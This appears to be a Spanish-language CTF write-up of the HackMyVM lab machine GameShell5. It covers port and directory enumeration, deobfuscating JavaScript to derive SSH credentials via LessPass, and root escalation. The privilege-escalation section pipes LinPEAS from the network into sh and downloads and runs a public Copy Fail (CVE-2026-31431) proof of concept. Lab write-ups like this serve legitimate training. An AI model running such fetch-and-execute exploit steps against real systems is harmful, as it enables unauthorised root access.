---
author: Lenam
pubDatetime: 2026-05-13T15:00:00Z
title: WriteUp GameShell5 - HackMyVM
urlSlug: gameshell5-writeup-hackmyvm
featured: false
draft: false
ogImage: "../../../assets/images/gameshell5/OpenGraph.png"
tags:
    - writeup
    - hackmyvm
    - javascript-desofuscacion
    - lesspass
    - copy-fail
description:
    "Writeup de la máquina GameShell5 de HackMyVM: enumeración web, desofuscación de JavaScript, generación de credenciales con LessPass y escalada de privilegios mediante Copy Fail."
lang: es
translationId: gameshell5-writeup-hackmyvm
---

![HackMyVM](../../../assets/images/gameshell5/OpenGraph.png)

Writeup de la máquina **GameShell5** de [HackMyVM](https://hackmyvm.eu/): En esta máquina, creada por **Sublarge**, desofuscaremos código JavaScript, exploraremos el gestor de contraseñas LessPass y aprovecharemos la última gran vulnerabilidad de Linux conocida como Copy Fail.


![HackMyVM](../../../assets/images/gameshell5/gameshell5.png)


## Tabla de contenido


---

## Enumeración

El primer paso consiste en identificar qué servicios expone la máquina y con qué versiones, para decidir por dónde continuar el ataque.

![Pantalla Virtual Box Machine](../../../assets/images/gameshell5/screenshot-vbox.png)

El primer `nmap` recorre **todos los puertos TCP** (`-p-`), asume el host como activo sin ping ICMP (`-Pn`, útil cuando el firewall bloquea ping pero los puertos responden) y evita resolución DNS inversa (`-n`) para que el escaneo sea más rápido y predecible. El resultado muestra dos puertos abiertos: **22** (SSH) y **80** (HTTP).

```bash
$ nmap -p- -Pn -n 10.0.2.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-13 14:28 CEST
Nmap scan report for 10.0.2.13
Host is up (0.000063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E8:44:57 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.24 seconds

```

El segundo `nmap` se ejecuta únicamente sobre esos puertos y añade la detección de servicios y la ejecución de scripts por defecto (`-sV` para identificar la versión del banner; `-sC` para ejecutar scripts considerados seguros). De este modo, se obtienen las versiones de OpenSSH y Apache.

```bash
$ nmap -p22,80 -sVC -Pn -n 10.0.2.13            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-13 14:30 CEST
Nmap scan report for 10.0.2.13
Host is up (0.00049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Retro Bowl
| http-robots.txt: 4 disallowed entries 
|_/*.js$ /*.js? /*.css$ /*.css?
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:E8:44:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds

```

```bash
$ curl http://10.0.2.13   
        <title>Retro Bowl</title>
<iframe src="https://shellshock.io/?utm=chromeext" frameborder="0" scrolling="yes" width="100%" height="100%" loading="lazy"></iframe>

<style type="text/css">iframe { position: absolute; width: 100%; height: 100%; z-index: 999; }</style>
```

El HTML que se sirve en el puerto 80 contiene un iframe que embebe un juego online externo.

> ⚠️ **Aviso importante:** Ese sitio web que se carga en el iframe es un servicio tercero, ajeno al entorno del CTF. Bajo ningún concepto debemos intentar atacar, escanear ni interactuar con ese dominio externo: hacerlo puede ser ilegal y además NO es la finalidad del reto. Nuestro único objetivo debe ser la IP interna del laboratorio, nunca recursos de internet ajenos al ejercicio.

Con este escaneo rápido con Gobuster descubrimos los archivos y rutas principales accesibles en la web objetivo, incluyendo archivos como index.html, style.css, script.js, robots.txt y el endpoint prohibido server-status.

```bash
$ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.0.2.13/ -x html,php,js,txt,zip,tar,css
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,js,txt,zip,tar,css,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 273]
style.css            (Status: 200) [Size: 50645]
script.js            (Status: 200) [Size: 13483]
robots.txt           (Status: 200) [Size: 84]
server-status        (Status: 403) [Size: 274]
Progress: 1764456 / 1764456 (100.00%)
===============================================================
Finished
===============================================================
```

El archivo `robots.txt` recuperado mediante `curl` desde la raíz del sitio contiene restricciones típicas para los rastreadores (user-agent `*`). Se especifica el bloqueo a URLs que terminan en `.js` o `.css` (tanto terminaciones exactas como parámetros con signo de interrogación), lo que suele buscar evitar que buscadores indexen archivos JavaScript y CSS.

```bash
$ curl http://10.0.2.13/robots.txt
User-agent: *
Disallow: /*.js$
Disallow: /*.js?
Disallow: /*.css$
Disallow: /*.css?
```

Este tipo de configuración es habitual para proteger ciertos recursos estáticos de la indexación, pero no representa necesariamente una barrera de seguridad; simplemente sugiere a los bots no indexar estos tipos de ficheros.

## Intrusión

Al revisar los resultados vemos que los archivos `style.css` y `script.js` identificados con gobuster no están siendo referenciados en la página `index.html`. Esto resulta llamativo y motiva a analizarlos con mayor detalle.

El archivo `script.js` se encuentra ofuscado:

```bash
$ curl http://10.0.2.13/script.js 
(function(_0x58bb25,_0x331bd0){function _0x5bddb3(_0x1ec754,_0x2f330a,_0x586ba6,_0x118108){return _0xadc0(_0x586ba6-0xa3,_0x2f330a);}const _0x59ed98=_0x58bb25();function _0x1e1950(_0x3bf959,_0x2be6e1,_0x188497,_0x447fd8){ ...  const loginName='noob',masterPass=_0x43faef(0x2d,0x3e,0x43,0x4b)+'kLmNoP';
```

Por otro lado, el archivo `style.css` contiene una imagen codificada en base64 de manera embebida:

```bash
$ curl http://10.0.2.13/style.css
body {
  margin: 0;
  padding: 0;
  background: #f5f5f5;
  background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB+8AAAHLCAYAAAAJAdquAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAIABJREFUeJzs3XeYXVXVx/HvpEwqKYSO0gSkd6TZQEQQkA5iA4GgWLCgL9gQFRVRsaKAioqIUhUQUCwoCnZRECmCAlIERFoIpM77x7pjJskkmXLvWad8P89znxlIcvfK5Mzcfc9v77W7enp6kNRRI4B1gI2B1YCVW49VgZVaHye3fu/k1u8HeLT18SngEeDh1uPfwD/6PO4E5nT6LyFJkiRJkiRJkiSpc7oM76W2GgdsBmwObNH6uBkwsYNjzgZuBm4E/gxcD/wJmNvBMSVJkiRJkiRJkiS1keG9NDwjge2BXYGdW5+PSa0oPAX8BrgGuJII9f1mlyRJkiRJkiRJkkrK8F4avDHAHsA+wF7ACrnlDMj9RIh/EfATYF5uOZIkSZIkSZIkSZL6MryXBqYLeBHwGuAAYEpuOcPyIHAhcC7w2+RaJEmSJEmSJEmSJGF4Ly3LZOAQ4Fhg4+RaOuEW4Ezga8CM5FokSZIkSZIkSZKkxjK8l/q3LnAccBgwLrmWIjwBfAU4jWixL0mSJEmSJEmSJKlAhvfSwjYFTgT2B0Yk15JhFnAOcCpwR3ItkiRJkiRJkiRJUmMY3kthLeA9wJHAyNxSSmEO8HXgJOCB3FIkSZIkSZIkSZKk+jO8V9NNJQLqY4DRuaWU0lNEK ... 3/GwAAAAAAAMC6/B91mVarORIqCQAAAABJRU5ErkJggg==');
  font-family: "Arial", sans-serif;
}

.container {
  width: 1200px;
  margin: 0 auto;
  padding: 20px;
}

.btn {
  padding: 8px 16px;
  border: none;
  border-radius: 4px;
  background: #4299e1;
  color: white;
  cursor: pointer;
}
```

### Imágen LessPass en CSS

El siguiente comando permite extraer y guardar localmente la imagen embebida en base64 que se encuentra en la propiedad `background-image` del archivo CSS:

```bash
curl -s http://10.0.2.13/style.css | sed -n "s/.*background-image: *url(['\"]data:image\/png;base64,\([^'\"]*\)['\"].*/\1/p" | base64 -d > image.png
```

Tras extraer la imagen embebida en el CSS, vemos que corresponde al logotipo de **LessPass**, un gestor de contraseñas que no almacena nunca las contraseñas, sino que las genera dinámicamente a partir de la contraseña maestra, usuario y nombre del servicio. Si se pierde alguno de estos datos, no es posible recuperar la contraseña generada.

![LessPass](../../../assets/images/gameshell5/less-pass.png)

Más detalles:  
[How does LessPass work?](https://blog.lesspass.com/2016-10-19/how-does-it-work)  
Código fuente: [GitHub LessPass](https://github.com/lesspass/lesspass/)


### Desofuscación de JavaScript

Si copiamos el JavaScript ofuscado que obtuvimos en `script.js` y lo analizamos con la herramienta en línea de desofuscación `https://deobfuscate.relative.im/`, encontraremos unas constantes muy interesantes al final del script.

```javascript
const site = 'shell-shockers.dsz'
const loginName = 'noob',
  masterPass = 'aBcDeFgHiJkLmNoP'
```

![JavaScript](../../../assets/images/gameshell5/javascript.png)

### Credenciales SSH noob

Solo nos queda combinar todo: utilizar LessPass junto con las constantes encontradas en el código ofuscado.

Podemos instalar LessPass o acceder directamente al sitio web https://lesspass.com/, donde, dejando las opciones, longitud y contador por defecto, obtendremos la contraseña del usuario noob.

![JavaScript](../../../assets/images/gameshell5/less-pass-noob.png)

Accedemos al servidor mediante SSH utilizando las credenciales generadas con LessPass, lo que nos permite leer la flag ubicada en el archivo user.txt.

```
$ ssh noob@10.0.2.13
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
noob@10.0.2.13's password: 
Linux GameShell5 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 12 12:06:48 2026 from 10.0.2.12
noob@GameShell5:~$ cat user.txt
flag{XXXXXXXXXXXXXXXXXXXXXXXXX}

```

## Escalada de privilegios

### Linpease

Si descargamos LinPeas y lo ejecutamos, no funcionará correctamente porque no encuentra el binario `grep`.

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

...
sh: 459: grep: not found
sh: 461: grep: not found
sh: 477: grep: not found
sh: 477: grep: not found
sh: 478: grep: not found
sh: 478: grep: not found
...

```

Sin embargo, el sistema operativo tiene instalado `busybox`, que incluye `grep` incorporado. Por lo tanto, podemos crear un enlace simbólico llamado `grep` apuntando a `busybox` y añadir la ruta al `PATH` para que LinPeas lo utilice correctamente. Así, lograremos ejecutar LinPeas sin problemas.

El comando para hacerlo sería:

```
ln -s /bin/busybox grep && export PATH=$PWD:$PATH
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Encontramos que el sistema es vulnerable a Copy Fail con linpease.

![Linpease](../../../assets/images/gameshell5/copy-fail-linpease.png)

### Copy Fail exploit

> Nota: No estoy completamente seguro de si esta era la vía intencionada para la escalada de privilegios en la máquina, ya que la vulnerabilidad de Copy Fail es relativamente moderna y afecta a muchos sistemas recientes. Además, observé que hay varios usuarios creados en el sistema, lo que me hace pensar que podría existir otra ruta de escalada, posiblemente mediante algún tipo de movimiento lateral que, en mi caso, no llegué a encontrar. Si descubres otra forma o la ruta "oficial", ¡me encantaría conocerla!

Observamos que el sistema tiene instalado una versión de Python 3.9.0.

```bash
noob@GameShell5:~$ python3 --version
Python 3.9.2
```

Buscamos un exploit de copy fail que funcione con la versión de python del sistema y encontramos la siguiente.

[https://github.com/w3llr00t3d/CVE-2026-31431-PoC](https://github.com/w3llr00t3d/CVE-2026-31431-PoC)

La descargamos y la ejecutamos y obtenemos credenciales de root.

```bash
wget https://github.com/w3llr00t3d/CVE-2026-31431-PoC/raw/refs/heads/main/poc.py
python3 ./poc.py
```

Obtenemos credenciales de root y podemos leer la flag de root.txt.


![Root flag](../../../assets/images/gameshell5/root-flag.png)


> ¡Gracias por leer este writeup! Espero que te haya servido, que hayas aprendido algo nuevo o al menos que te hayas divertido siguiendo el proceso. ¡Nos vemos en el próximo reto!

---

## Referencias

Material de consulta alineado con lo que aparece en el writeup (enumeración web, **LessPass**, desofuscación de JavaScript, **LinPEAS** en entornos mínimos y escalada **Copy Fail**):

- [HackMyVM](https://hackmyvm.eu/) — plataforma de la máquina **GameShell5**
- [Nmap](https://nmap.org/book/man.html) — escaneo de puertos y detección de servicios (`-p-`, `-sV`, `-sC`)
- [Gobuster](https://github.com/OJ/gobuster) — fuzzing de directorios y extensiones en HTTP
- [SecLists — wordlists web](https://github.com/danielmiessler/SecLists) — listas como la usada con Gobuster
- [LessPass — How does it work?](https://blog.lesspass.com/2016-10-19/how-does-it-work) — generación determinista de contraseñas (sitio, usuario, contraseña maestra)
- [LessPass — código fuente](https://github.com/lesspass/lesspass)
- [lesspass.com](https://lesspass.com/) — generador en línea citado en el writeup
- [Deobfuscate (relative.im)](https://deobfuscate.relative.im/) — herramienta en línea para analizar el `script.js` ofuscado
- [PEASS-ng / LinPEAS](https://github.com/peass-ng/PEASS-ng) — script de enumeración para escalada de privilegios
- [BusyBox](https://busybox.net/) — utilitarios compactos; enlace simbólico `grep` → `busybox` cuando falta GNU `grep` en el `PATH`
- [PoC Copy Fail — CVE-2026-31431](https://github.com/w3llr00t3d/CVE-2026-31431-PoC) — exploit en Python usado tras detectar la vulnerabilidad con LinPEAS
